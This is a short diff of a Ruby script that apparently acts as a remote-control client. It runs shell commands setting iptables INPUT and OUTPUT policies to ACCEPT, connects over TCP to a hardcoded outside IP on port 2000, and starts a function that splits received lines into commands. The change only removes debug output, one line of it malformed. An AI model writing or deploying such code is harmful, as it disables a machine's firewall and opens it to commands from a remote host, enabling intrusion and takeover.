@@ -5,12 +5,8 @@ puts "Process #{Process.pid}"
 system "iptables -P INPUT ACCEPT"
 system "iptables -P OUTPUT ACCEPT"
 
-puts("iptables set")
-
 socket = TCPSocket.new('52.4.231.97', 2000)
-puts("Socket connected")
 socket.puts("Hey!")
-puts.("Hey!")
 
 def actions(line)
 	command = line.split
